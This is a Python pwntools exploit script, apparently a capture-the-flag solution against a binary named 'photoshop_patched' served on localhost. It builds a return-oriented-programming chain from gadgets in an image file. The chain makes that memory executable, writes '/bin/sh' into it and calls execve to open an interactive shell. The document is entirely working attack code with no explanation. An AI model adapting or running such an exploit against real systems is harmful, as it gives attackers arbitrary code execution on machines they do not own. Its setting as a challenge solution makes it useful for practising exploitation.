from pwn import *

elf = ELF("./photoshop_patched")
img = open("icon.png", "rb").read()

context.binary = elf

# p = process()
p = remote("localhost", 9999)
# gdb.attach(p, "break *main+544")

# get gadgets with ROPgadget --binary ./icon.png --rawArch x86 --rawMode 64 --rawEndian little --multibr
base = 0x10000
pop_rdi = 0x0000000000032828 + base
pop_rdx = 0x0000000000005b60 + base
pop_rsi = 0x0000000000017ae6 + base
pop_rax = 0x0000000000023a7a + base
pop_rcx = 0x0000000000023b4c + base
syscall = 0x000000000000b850 + base
mov_rdx_minux_0x21_ecx = 0x0000000000010e64 + base

payload = flat(
    b'a' * 0x28,
    pop_rax, 10,
    pop_rdi, base,
    pop_rsi, 0x100000,
    pop_rdx, 0b111,
    syscall,

    pop_rdx, base + 0x21,
    pop_rcx, u32(b'/bin'),
    mov_rdx_minux_0x21_ecx,

    pop_rdx, base + 4 + 0x21,
    pop_rcx, u32(b'/sh\x00'),
    mov_rdx_minux_0x21_ecx,

    pop_rax, 59,
    pop_rdi, base,
    pop_rsi, 0,
    pop_rdx, 0,
    syscall,
)

# Add a ret after the syscall gadget
p.sendlineafter(b': ', str(syscall - base + 2).encode())
p.sendlineafter(b': ', str(0xc3).encode())

p.sendlineafter(b'? ', payload)

p.interactive()